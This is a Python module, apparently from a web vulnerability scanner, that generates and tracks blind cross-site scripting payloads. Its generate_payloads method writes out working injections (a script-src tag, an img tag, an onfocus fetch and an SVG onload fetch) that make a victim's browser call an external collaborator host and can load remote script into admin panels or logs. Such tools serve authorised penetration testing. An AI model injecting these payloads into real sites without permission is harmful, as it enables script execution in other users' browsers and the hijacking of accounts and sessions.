"""
Blind XSS Module — Collaborator / OOB Based

Injects blind XSS payloads that phone home to an external collaborator URL
(Burp Collaborator, interactsh, custom webhook, etc.).

NO local IP or callback server is used — the user provides an external URL.
All injections are tracked in a JSON file for later correlation when the
collaborator receives a callback.
"""

import os
import json
import time
import random
import string
import threading
from typing import List, Dict, Optional


def _random_id(length: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


class BlindXSSInjector:
    """Generates and tracks blind XSS payloads using an external collaborator URL."""

    def __init__(self, collaborator_url: str, output_dir: str = 'output'):
        self.collaborator_url = collaborator_url.rstrip('/')
        self.output_dir = output_dir
        self.scan_id = _random_id(8)

        self._injections: List[Dict] = []
        self._lock = threading.Lock()
        self._counter = 0


    def generate_payloads(self, url: str, param_name: str) -> List[str]:
        """
        Generate a small set of blind XSS payloads for *one* parameter.

        Each payload embeds a unique tracking ID inside the collaborator URL
        so that when a callback arrives, we can correlate it back to the
        exact injection point.

        Returns 3-5 payloads covering different execution contexts:
          1. <script src=...> — classic external script load
          2. <img src=...>   — fires on image load (works in e-mail, logs, admin panels)
          3. Event-handler   — onfocus/onerror with fetch() to collaborator
          4. SVG onload      — works in many sanitiser bypasses
        """
        payloads: List[str] = []

        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'"><script src={callback}></script>'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'script_src')

        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'"><img src={callback}>'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'img_src')

        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'" autofocus onfocus="fetch(\'{callback}\')" x="'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'event_fetch')

        tag_id = self._next_id()
        callback = f"{self.collaborator_url}/{self.scan_id}/{tag_id}"
        p = f'"><svg onload=fetch("{callback}")>'
        payloads.append(p)
        self._track(url, param_name, p, tag_id, 'svg_onload')

        return payloads


    def _next_id(self) -> str:
        with self._lock:
            self._counter += 1
            return f"{self.scan_id}_{self._counter}"

    def _track(self, url: str, param: str, payload: str, tag_id: str, technique: str):
        with self._lock:
            self._injections.append({
                'scan_id': self.scan_id,
                'tag_id': tag_id,
                'timestamp': time.time(),
                'url': url,
                'parameter': param,
                'payload': payload,
                'technique': technique,
                'callback_url': f"{self.collaborator_url}/{self.scan_id}/{tag_id}",
            })

    @property
    def injections(self) -> List[Dict]:
        with self._lock:
            return list(self._injections)

    @property
    def injection_count(self) -> int:
        with self._lock:
            return len(self._injections)


    def save_tracking(self) -> str:
        """
        Save injection tracking data to a JSON file.
        Returns the file path.
        """
        os.makedirs(self.output_dir, exist_ok=True)
        path = os.path.join(self.output_dir, 'blind_xss_tracking.json')

        data = {
            'scan_id': self.scan_id,
            'collaborator_url': self.collaborator_url,
            'total_injections': self.injection_count,
            'injections': self.injections,
        }

        with self._lock:
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

        return path

    def get_tracking_data(self) -> Dict:
        """Return tracking data as a dictionary (for embedding in reports)."""
        return {
            'scan_id': self.scan_id,
            'collaborator_url': self.collaborator_url,
            'total_injections': self.injection_count,
            'injections': self.injections,
        }

